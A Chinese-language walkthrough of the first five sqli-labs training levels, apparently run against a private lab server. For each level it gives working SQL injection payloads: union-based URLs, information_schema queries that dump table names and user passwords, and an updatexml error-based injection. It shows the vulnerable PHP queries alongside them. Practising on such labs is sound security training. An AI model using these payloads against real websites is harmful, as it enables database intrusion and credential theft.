### Sqli-labs



1. less-1,single quotes - String

显示位置在2,3号

http://192.168.217.113:7766/Less-1/?id=1' union select 1,2,3 limit 1,1 --+

```sql
// 查询库名： 
(select group_concat(schema_name) from information_schema.schemata)
// 查询表名： 
(select group_concat(table_name) from information_schema.tables where table_schema='security')
// 查询表内列名： 
(select group_concat(column_name) from information_schema.columns where table_name='users')
// 爆破所有数据: 
(select group_concat(username) from security.users) ,  (select group_concat(password) from security.users)
```





2. Less-2, - integer

http://192.168.217.113:7766/Less-1/?id=1 union select 1,2,3 limit 1,1 --+

整型和字符型的区别  在于需不需要提前使用`'`进行截断

```php
// 字符串型
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
// 整型
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```



3. Less-3,Single quotes with twist - String

http://192.168.217.113:7766/Less-1/?id=1') union select 1,2,3 limit 1,1 --+

上面的方式不能生效了，对比之后多了个`()`，因此需要补全括号，否则永远被括号括起来，最后结果还是逃不掉最后的limit

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```



4. Less-4,Double Quotes - String

http://172.16.51.129:7766/Less-4/?id=1") union select 1,2,3 limit 1,1 --+

 使用`""`对查询内容进行拼接，并且放在了`()`中。

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";

```



5. Less-5,Single Quote - String

http://172.16.51.129:7766/Less-5/?id=1'

从输出可知（无回显），页面只会展示成功或失败的逻辑，但是输入`1'`会输出错误，则可以使用错误注入

```
// 查询表明
and (updatexml(1,concat(0x7e, (select group_concat(schema_name) from information_schema.schemata) ,0x7e),1));
```

